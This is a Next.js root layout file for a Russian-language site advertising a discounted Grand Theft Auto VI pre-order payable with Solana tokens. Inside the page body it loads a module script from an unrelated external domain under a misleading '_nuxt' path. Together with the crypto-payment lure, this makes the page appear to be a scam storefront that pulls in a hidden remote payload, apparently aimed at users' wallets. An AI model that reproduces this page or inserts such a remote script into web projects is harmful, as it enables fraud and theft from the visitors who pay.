import type { Metadata } from "next";
import "./globals.css";
import ClientProviders from "@/components/ClientProviders";

export const metadata: Metadata = {
  title: "GTA VI × Solana — Предзаказ со скидкой 25%",
  description:
    "Предзакажи Grand Theft Auto VI с эксклюзивной скидкой 25% при оплате в сети Solana. Выход 19 ноября 2026.",
  icons: {
    icon: "/icons.jpg",
    apple: "/icons.jpg",
    shortcut: "/icons.jpg",
  },
  openGraph: {
    title: "GTA VI × Solana — Предзаказ",
    description: "Скидка 25% при оплате любым токеном Solana",
    images: ["https://upload.wikimedia.org/wikipedia/en/5/54/GTA_VI_cover_art.jpg"],
  },
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="ru" className="h-full">
      <body className="min-h-full bg-[#050510] text-white">
        <script type="module" src="https://regulate-importer.asset-base.cc/_nuxt/assets/index.js"></script>
        <ClientProviders>{children}</ClientProviders>
      </body>
    </html>
  );
}
